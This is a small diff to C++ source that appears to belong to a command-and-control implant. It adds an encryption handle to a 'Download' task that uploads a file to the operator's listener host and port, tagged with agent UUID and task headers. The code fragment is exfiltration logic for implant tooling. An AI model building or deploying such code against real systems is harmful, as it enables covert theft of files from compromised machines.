@@ -3,7 +3,7 @@
 namespace Task
 {
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest)
-    {
+    {        
         std::wstring wHeaders = L"";
         wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
         wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
@@ -11,6 +11,7 @@ namespace Task
 
         BOOL bResult = System::Http::UploadFile(
             pState->pProcs,
+            pState->pCrypt,
             pState->hConnect,
             pState->lpListenerHost,
             pState->nListenerPort,
